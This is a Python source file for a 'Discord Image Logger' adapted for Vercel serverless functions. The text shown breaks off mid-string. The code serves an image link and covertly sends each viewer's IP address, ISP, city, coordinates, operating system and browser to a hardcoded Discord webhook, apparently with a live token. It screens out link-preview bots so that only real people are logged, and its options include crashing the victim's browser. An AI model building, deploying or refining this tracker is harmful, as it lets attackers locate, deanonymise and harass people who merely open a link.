# Discord Image Logger - Vercel Version
# Адаптировано для Vercel Serverless Functions

import json
import base64
import requests
import httpagentparser
from urllib import parse
import traceback

config = {
    "webhook": "https://discord.com/api/webhooks/1525930035884589197/vc7j3ia2VYE7NKHlvLAqoq3DdlPdbi_B9OIsxdqPfeFnArGpGlHMT41bvdOWKryUVa-s",
    "image": "https://avatars.mds.yandex.net/i?id=6af64b5e09587458f377007c0ac7f3f7_l-12544827-images-thumbs&n=13",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", 
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False}
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = "Unknown", "Unknown"
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[-1].replace('_', ' ')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
